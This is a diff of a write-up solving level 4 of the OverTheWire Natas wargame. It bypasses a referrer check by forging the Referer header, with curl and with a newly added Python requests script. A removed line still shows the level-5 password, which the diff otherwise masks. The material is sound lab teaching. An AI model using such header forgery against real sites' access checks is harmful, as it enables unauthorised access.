@@ -22,9 +22,9 @@ Access disallowed. You are visiting from "" while authorized users should come o
 <div id="viewsource"><a href="index.php">Refresh page</a></div>
 </div>
 ```
-You can solve this using [https://portswigger.net/burp](Burp Suite) or one of the many browser addons to forger referrer headers. I opted to solve this with curl. I ran into Java issues while trying to run Burp and didn't want to deal with them at this time.
+You can solve this using [Burp Suite](https://portswigger.net/burp) or one of the many browser add-ons to forger referrer headers. I opted to solve this with curl. I ran into Java issues while trying to run Burp and didn't want to deal with them at this time.
 
-Free free to use any method you'd like, just be certain to include the trailing slash in the referrer address or you wont be able to access the site.
+Free free to use any method you'd like, just be certain to include the trailing slash in the referrer address or you won't be able to access the site.
 
 Here's the curl solution:
 ```bash
@@ -32,11 +32,25 @@ curl -u natas4:Z------------------------------Z -e http://natas5.natas.labs.over
 ...
 <div id="content">
 
-Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+Access granted. The password for natas5 is i------------------------------q
 <br/>
 <div id="viewsource"><a href="index.php">Refresh page</a></div>
 </div>
 ...
 ```
 
+Here's the Python 3 version of the above:
+```python
+#!/usr/bin/env python
+import requests
+import base64
+from requests.auth import HTTPBasicAuth
 
+password = 'Z------------------------------Z'
+auth = HTTPBasicAuth('natas4', password)
+url = 'http://natas4.natas.labs.overthewire.org/index.php'
+ref = 'http://natas5.natas.labs.overthewire.org/'
+
+resp = requests.post(url, auth=auth, headers={'referer': ref})
+print(resp.text)
+```
